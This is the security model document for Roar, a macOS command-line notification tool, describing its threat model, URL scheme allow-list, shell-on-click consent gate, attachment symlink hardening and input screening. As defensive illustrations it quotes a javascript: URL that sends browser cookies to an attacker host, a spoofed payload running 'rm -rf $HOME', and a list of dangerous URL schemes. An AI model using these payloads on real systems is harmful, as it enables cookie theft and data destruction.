# Roar Security Model

Roar is an ad-hoc-signed CLI that posts notifications under a fixed
bundle identifier (`io.myers.roar`). This document describes what
Roar defends against, what it deliberately does **not** defend
against, and the rationale for each gate.

> If you find a security issue, please open a GitHub issue. For
> sensitive disclosures, see the `SECURITY.md` policy at the
> repository root (if present) or contact the maintainer directly.

## Threat model

The threats Roar takes seriously, in roughly decreasing order of
likelihood:

1. **User-typo footguns.** A user types `roar send --exec "..."` and
   doesn't realise that a click runs a shell command. Or types
   `--at 2025-...` and the notification fires immediately because
   it's now 2026. Or `--attachment /tmp/foo.png` where `foo.png`
   turns out to be a symlink to `~/.ssh/id_rsa`.
2. **Stale / spoofed userInfo at click time.** A notification stays
   in Notification Center for hours; the click handler must
   re-validate everything in the notification's `userInfo` from
   scratch, in case the value was written by an older Roar build
   *or* by another process running under the same bundle id.
3. **Bytes that survive validation but corrupt later.** NUL bytes in
   identifiers/titles/exec strings truncate at the XPC C-string
   bridge or in `strdup(3)`; control characters in titles render
   terminal escape sequences in `roar list`; URL credentials leak
   into stderr scrollback.
4. **Concurrent / racing operations.** A `roar send` running
   concurrently with `roar clear --categories` could lose a
   freshly-registered dynamic category; a TOCTOU between attachment
   validation and `UNNotificationAttachment.init` could swap the
   file under the notification.

The threats Roar **does not** take seriously, because the platform
makes them out of scope:

- **Same-user RCE.** A same-user attacker who can post under
  `io.myers.roar` can already exec as your user. macOS does not
  scope notification delivery by process identity; the bundle id is
  the only identifier `usernoted` knows. See the **Same-bundle-id
  spoofing** section below.
- **Network-level attacks.** Roar does not make network requests.
  `--attachment` is local-paths-only. Click-time `NSWorkspace.open`
  hands a URL to LaunchServices, which becomes a network actor on
  the user's behalf — but Roar's role ends with the validated URL.
- **Hostile macOS.** Roar assumes `usernoted`, `lsregister`,
  `posix_spawn`, `realpath`, `lstat`, and the rest of the system
  are honest. Defending against a compromised OS is not in scope
  for a CLI utility.

## Defences

### 1. URL scheme allow-list (`--open-url`)

`--open-url` accepts schemes from a tiny allow-list by default:
`http`, `https`, `mailto`. Every other scheme — *every* other
scheme — must be added one at a time with `--allow-url-scheme`:

```sh
roar send --open-url "vscode://file/foo.swift" --allow-url-scheme vscode
```

#### What the allow-list actually defends against — and what it doesn't

It's easy to look at the example above and ask "if I'm typing both
flags myself, what is `--allow-url-scheme` adding?" In *that exact
case* — a user typing both a literal URL and the matching consent
flag in the same command — it's adding very little. That's not
the case the flag exists for.

The allow-list does real work in three other situations:

1. **The URL is not a literal — it comes from a variable.** The
   typical script shape is:

   ```sh
   roar send --body "Open the issue" --open-url "$URL"
   ```

   where `$URL` was built from CI output, a webhook payload, an
   env var, or another tool's `--print-url`. If that string turns
   out to be
   `javascript:fetch("https://evil.example/?c="+document.cookie)`,
   Roar **without the allow-list** would happily post the
   notification and the click would run JS in the user's default
   browser. With the allow-list, the send is rejected at parse
   time:

   ```
   URL scheme 'javascript' is not in the allow-list. Allowed
   schemes: http, https, mailto. Add it with --allow-url-scheme
   javascript (be aware that some schemes — javascript, data,
   file, applescript, etc. — can carry executable or filesystem-
   side-effect content).
   ```

   No notification is created. The default-deny posture protects
   the script case where the user isn't reading every URL by eye.

2. **The click happens later, possibly in a different process.**
   `--in` / `--at` schedule a notification that sits in
   `usernoted` until it fires. When the user clicks it, macOS
   launches Roar's bundle and delivers the click to a fresh
   process. That click-handler process **re-validates** the URL
   against the allow-list the original send pinned into the
   notification's userInfo blob (`roar.open.allowedSchemes`). See
   `ClickSideEffects.openClickURL`:

   ```swift
   let effective = allowedSchemes ?? URLValidation.defaultOpenSchemes
   let url = try URLValidation.parse(raw, allowedSchemes: effective)
   ```

   The re-validation **fails closed**: if the userInfo blob is
   missing or garbled (stale older-version send, malformed write
   by another process), the click-handler narrows to the http /
   https / mailto defaults — strictly tighter than any user-
   extended set. Without a per-scheme allow-list there'd be
   nothing to pin and nothing to fail-close against.

3. **No "allow everything" flag.** The historical
   `--allow-any-url-scheme` was removed on review for the reason
   set-once-and-forget flags always get removed: they invite a
   one-time decision (during debugging, say) that survives forever
   in a shell rc or wrapper script. Per-scheme consent ties the
   decision to one specific scheme the user knows they need, in
   the exact `roar send` invocation that needs it.

#### What it does NOT defend against

- **A user typing `--open-url '<dangerous>' --allow-url-scheme
  <dangerous>` themselves.** That is consent. Roar's job, given
  both flags, is to do what the user asked.
- **A same-bundle-id spoofer.** A process running under
  `io.myers.roar` controls both `roar.open.url` *and*
  `roar.open.allowedSchemes` in its own userInfo. The click
  handler will obey both. See § 3 (Same-bundle-id spoofing).
- **A URL pointing at a hostile https site.** The allow-list is
  about *scheme classes*, not destinations. `https://evil.example/x`
  passes — destination policy is the browser's problem.

#### What the dangerous schemes are

Schemes that have no business being in a notification's
`--open-url` unless the user explicitly knows the risk:

- **Script-bearing:** `javascript:`, `vbscript:`, `data:` (can
  carry inline HTML that runs script), `applescript:`,
  `x-apple-helpbasic:`, `shell:`.
- **LaunchServices side-effect launchers:** `file:` (`.command` /
  `.tool` / `.workflow` / `.app` get *executed* by LaunchServices
  on open), `afp:`, `smb:`, `nfs:`, `ftp:`, `ftps:` (Finder
  mounts the share with the user's credentials; subsequent
  auto-open / quick-look against the freshly-mounted filesystem
  is the same RCE shape as `file:` but reached over the network).
- **Auto-subscribers / feed openers:** `webcal:`, `webcals:`,
  `feed:`, `news:`, `nntp:`.
- **Terminal launchers:** `telnet:`, `rlogin:`, `tn3270:`,
  `gopher:`.

None of these have legitimate `--open-url` workflows that justify
including them in a default allow-list. If you genuinely need
one, opt in for that one scheme at the time you need it.

#### Other URL gates

Roar also rejects:

- **Embedded URL credentials.** `https://user:password@example.com`
  is rejected because the URL is stored verbatim in userInfo and
  would appear in error output / terminal scrollback / CI logs.
- **Schemeless garbage.** `URL(string:)` will parse `"lol"` as a
  URL with no scheme; Roar requires a non-empty scheme.
- **Empty targets.** `https://` (no host, no path) is rejected
  because `NSWorkspace.open` silently no-ops on it — easy to miss.
- **Syntactically invalid scheme names** in `--allow-url-scheme`.
  Schemes must match RFC 3986: `letter (letter|digit|+|-|.)*`. A
  garbled value (`"foo bar"`, `"foo,bar"`) is rejected at parse
  time so it can't slip into the userInfo blob and confuse the
  click-time deserialiser.

Source: [`Sources/URLValidation.swift`](../Sources/URLValidation.swift),
[`Sources/ClickSideEffects.swift`](../Sources/ClickSideEffects.swift).

### 2. Shell-on-click consent gate (`--exec`)

`--exec "<cmd>"` runs the command through `/bin/sh -c` on click. To
avoid notifications like "Build complete" silently carrying an
unrelated shell payload, Roar requires the explicit consent flag
`--allow-shell-on-click` at **send time**:

```sh
roar send --body "Done" \
    --exec "afplay /System/Library/Sounds/Glass.aiff" \
    --allow-shell-on-click
```

Without `--allow-shell-on-click`, `--exec` is rejected with a
diagnostic that points at the consent flag.

This is enforced by `Send.validateExecOptIn` at parse time. The
click handler does **not** re-check the consent flag because the
consent flag is information the *user* needed at the keyboard, not
the click handler.

### 3. Same-bundle-id spoofing — what's in scope, what isn't

macOS does not let an app's notification delivery be scoped by
sending process. Any process running as your user that posts under
`io.myers.roar` will be delivered as a "Roar" notification, and
Roar's click handler trusts the notification's userInfo to know
what to do on click.

Concretely: another process can craft a notification with

```
userInfo = {
    "roar.exec.consent": "1",
    "roar.exec.command": "rm -rf $HOME",
}
```

and Roar's click handler will obey it. This is **not** mitigated by
`--allow-shell-on-click`, which is a *send-time* gate. The click
handler has no cryptographic way to distinguish "your `roar send`
posted this" from "some other process posted this."

Roar's perspective on this: a same-user attacker who can post under
your bundle id can already exec as your user without Roar's help.
The defences that *do* apply close attack shapes that don't require
a local-process compromise:

- NUL-byte rejection across every XPC string field.
- The URL scheme allow-list re-validated at click time.
- Attachment path canonicalisation (`realpath(3)`) and symlink
  walks.
- Environment variable scrubbing on `posix_spawn`.
- An explicit signal-mask reset on spawned children
  (`POSIX_SPAWN_SETSIGMASK` + `sigemptyset`) and a SIGDFL flood
  (`POSIX_SPAWN_SETSIGDEF` + `sigfillset`) so AppKit's masked
  signals don't leak into the child.

If you're running random untrusted code as your user, the relevant
defence is at the OS / sandbox layer (`sandbox-exec`, sandboxed
helpers, separate accounts), not in Roar.

### 4. Attachment hardening

`--attachment` takes a **local filesystem path**. Remote URLs
(`http`, `https`, `ftp`) are rejected at parse time with a
"pre-download with curl" hint. The legitimacy of the local path
itself is then enforced by four layers:

1. **Leaf-level `lstat`.** `lstat(2)`, not `stat(2)` — the link
   itself, not the target. A symlink at the leaf is refused with
   a diagnostic that names the link, not the target it would have
   silently resolved to. (See `LEARNINGS.md` on why `lstat` beats
   `URL.resourceValues(forKeys: [.isSymbolicLinkKey])`.)
2. **Intermediate-component walk.** Every directory along the path
   is `lstat`-ed. If any intermediate is a symlink, it must be on
   the tiny macOS system-symlink allow-list:
   ```
   /tmp → private/tmp
   /var → private/var
   /etc → private/etc
   ```
   Anything outside that allow-list is refused outright. This
   closes the "pre-staged symlinked directory" attack: a path like
   `/tmp/safedir/foo.png` where `/tmp/safedir → ~/.ssh` would
   otherwise pass a leaf-only check and silently expose the
   target.
3. **`realpath(3)` canonicalisation.** The whole path is collapsed
   to its canonical form (every symlink resolved, `..` / `.`
   normalised). The canonical path is what's handed to
   `UNNotificationAttachment.init`, so the kernel `open(2)`'s the
   path the validator vetted.
4. **Defence-in-depth re-`lstat`.** A final `lstat` on the
   canonical path catches a TOCTOU swap between `realpath` and
   the attachment build.

The residual TOCTOU window — between `realpath` returning and
`UNNotificationAttachment.init`'s internal `open` — is microseconds
wide. Eliminating it would require an fd-based UN API (which UN
doesn't expose; it takes a URL, not a descriptor), or a temp-copy
intermediary (extra disk write, not worth the cost for this tier).
The walk turns "passive pre-staging works" into "an active race is
required," which is a meaningful upgrade.

Source: [`Sources/Commands/SendAttachment.swift`](../Sources/Commands/SendAttachment.swift).

### 5. Control-character / NUL screening

Every user-supplied string that crosses an XPC bridge is screened
for NUL bytes, and most also reject the full
`CharacterSet.controlCharacters`:

| Flag                     | NUL | Other control chars | Rationale |
|--------------------------|:---:|:-------------------:|-----------|
| `--title`                | ✅  | (allowed)           | NUL truncates the XPC C-string; newlines/tabs are legitimate display content. |
| `--subtitle`             | ✅  | (allowed)           | Same. |
| `--body`                 | ✅  | (allowed)           | Same. |
| `--identifier`           | ✅  | ✅                  | The id is a routing key for replace/dismiss; control chars in shell `case` arms are footguns. |
| `--target-content-id`    | ✅  | ✅                  | Same. |
| `--thread-id`            | ✅  | ✅                  | XPC routing key for grouping. |
| `--filter-criteria`      | ✅  | ✅                  | Focus filter match key. |
| `--exec`                 | ✅  | (allowed)           | `posix_spawn`'s `strdup` truncates at NUL; the visible command would diverge from what runs. |
| `--attachment` (path)    | ✅  | ✅                  | `lstat` / `readlink` / `realpath` truncate at NUL. |
| `--sound`                | ✅  | ✅                  | `appendingPathComponent` does no sanitisation; path traversal blocked by also rejecting `/`, `\\`, leading `.`. |

`roar list` separately flattens **all** control characters and
unicode line-separator codepoints in titles/bodies to spaces before
emitting them, so a notification body containing `\x1B[2J` (ANSI
erase-display) can't wipe the terminal of anyone running `roar
list`.

### 6. Locale-stable string comparisons

Several deny-list / allow-list comparisons depend on `String.lowercased()`
producing ASCII. Under Turkish (`LANG=tr_TR.UTF-8`),
`"FILE".lowercased()` produces `"fıle"` (dotless i), which would
miss an ASCII `"file"` deny-list key. URL schemes are ASCII per
RFC 3986, so Roar pins the locale to `en_US_POSIX` for every
security-relevant case fold:

- `--allow-url-scheme` normalisation
- `--at` parser (digits parse against ASCII, not Arabic-Indic)
- `--foreground-presentation` option-name match
- Attachment file-URL scheme classification
- `--repeat` keyword match (`fri`, `hourly`, etc.)

A user setting `LANG=tr_TR.UTF-8` can't slip a different scheme
past the gate.

### 7. `--at` past / near-past rejection

A past timestamp is rejected with a strict-past diagnostic; a
timestamp less than 1 second in the future is rejected with a
"too close to now" diagnostic. The earlier behaviour silently
clamped sub-floor values to "1 second from now," which broke the
"fires at the timestamp I provided" contract — a script passing a
near-now `--at` would get a notification at the floor instead of
the intended dropped-on-the-floor verdict.

### 8. Schedule bounds

`--in` accepts 1 second to 365 days. Values outside that range are
rejected with explicit floor / ceiling messages. The ceiling is a
typo guard: `--in 30000d` would otherwise schedule a notification
for year ~2110 and the user would never see it fire.

### 9. `--badge-count` semantics

Negative values are rejected. Use `--badge-count 0` to clear an
existing badge. Without this gate, negatives are interpreted by
the framework as "no change" or silently clamped depending on the
platform version — both of which surprise users who typed `-1`
expecting clearing semantics.

### 10. `--foreground-presentation none` rejection

The literal value `none` is rejected on both ends:

- **Send side:** `--foreground-presentation none` errors with a
  pointer to `--interruption-level passive` (the supported way to
  suppress break-through).
- **Click side:** the delegate's deserialiser refuses to honour a
  literal `"none"` from userInfo and falls through to the framework
  default (banner+list+sound+badge).

The asymmetry is intentional. An empty presentation set produces a
notification that's visually invisible but still click-actionable —
the worst kind of foothold for a same-bundle-id spoofer. The click
target must always be visible to the user.

### 11. `userInfo` size cap

The userInfo dict is property-list-serialised before being attached
to the request and the binary plist size is capped at 16 KB.
Oversize requests fail inside `add(_:)` with an opaque
`NSCocoaError` that's harder to debug than a clean pre-flight
rejection. The cap is well over any realistic Roar payload but
trips on pathological inputs.

### 12. stdin cap

When the body is read from a pipe, the read is capped at 1 MB. A
runaway pipe (`yes | roar send --body -`) hits the cap and Roar
emits a stderr warning about possible truncation. Without the cap,
a single misbehaving process could pull arbitrary memory into Roar's
address space.

### 13. Identifier length cap

`UNNotificationRequest.identifier` has a system-defined upper bound
that the framework documents as "system defined." Empirical
probing of `usernoted` puts it around 256 characters before
`add(_:)` returns a vague "internal error." Roar caps at 256 so the
diagnostic is clean. The same cap applies to `--target-content-id`,
`--thread-id`, and `--filter-criteria` (all share the XPC string
field's C-bridge truncation hazard).

### 14. Provisional-auth warning

Provisional notifications post quietly — no banner, no sound, no
badge break-through, no time-sensitive bypass. If you set any of
`--sound`, `--interruption-level time-sensitive`, or
`--badge-count` and the current auth status is provisional, Roar
writes a one-time stderr warning explaining that those affordances
are being silently downgraded and points the user at how to
promote.

### 15. `roar clear` safer default

Bare `roar clear` clears only *delivered* notifications. Scheduled
(`--in` / `--at`) requests are preserved. A user typing
`roar clear` from the shell prompt no longer destroys their own
upcoming work.

To clear both buckets, pass `--all` explicitly:

```sh
roar clear --all
```

The flags `--delivered`, `--pending`, `--all` are mutually
exclusive — pick one (or none for the safe default).

### 16. `roar dismiss` non-zero on no-match

UN's `removeDeliveredNotifications(withIdentifiers:)` silently
no-ops on unknown ids. Roar snapshots delivered + pending ids
*before* the remove calls and:

- Reports each unknown id on stderr by name (deduplicated, argv-
  ordered).
- Exits **`4`** if **every** supplied id was unknown.

A typo'd `roar dismiss` no longer returns 0 with the user believing
their notification was removed.

### 17. Click-time XPC drain

`exit()` after a click can race the XPC ack flush. Roar drains for
`RoarAppDelegate.exitDrainDelay` (100 ms) before terminating in
both the click-response path and the bulk remove paths
(`Dismiss.run`, `Clear.run`). Without the drain, `usernoted`
sometimes logs "abandoned response" entries when the process exits
too quickly.

### 18. Reserved action ids

`default`, `dismiss`, and `timeout` are reserved at parse time so
custom actions can't collide with the `--wait` stdout protocol.
A user typing `--action default:Foo` is rejected with the reserved-
id diagnostic; the stdout receiving end never has to disambiguate.

## Test coverage

Every security gate above is pinned by a dedicated test:

| Gate                                       | Test file |
|--------------------------------------------|-----------|
| URL allow-list / deny-list / RFC 3986      | `URLValidationTests` |
| `--exec` consent + NUL + empty             | `ExecuteOptInTests`, `ClickCommandSafetyTests` |
| Attachment symlink walk + canonicalisation | `AttachmentSymlinkTests`, `AttachmentPathWalkTests`, `AttachmentRealpathTests` |
| Attachment remote URL rejection            | `AttachmentRemoteRejectedTests` |
| Identifier / thread-id / filter-criteria NUL + length | `IdentifierValidationTests`, `ThreadIDValidationTests`, `FilterCriteriaTests` |
| `--at` past / near-future / locale         | `ScheduleTriggerTests` |
| `--repeat` Gregorian pin                   | `CalendarRepeatTests` |
| `--foreground-presentation` `none` rejection (send + click) | `ForegroundPresentationTests` |
| `userInfo` size cap                        | `UserInfoSizeTests` |
| `roar clear --categories` concurrent-send preservation | `ClearOrchestrationTests`, `CategoryPruneMergeTests` |
| `roar dismiss` unknown-id reporting        | `DismissValidationTests` |
| Click-time XPC drain                       | `WaitExitDrainTests` |
| Reserved action ids                        | `ActionParsingTests` |

If you find a gap, please open an issue.

## Reporting a vulnerability

For potentially-sensitive issues — particularly anything around the
click handler, the attachment walk, or the URL re-validation —
please open a GitHub issue tagged "security" with as little
exploit detail as possible while still being reproducible. The
maintainer will follow up by email.

For non-sensitive footguns (misleading help text, an error message
that doesn't point at the right flag, etc.), a regular issue or PR
is fine.
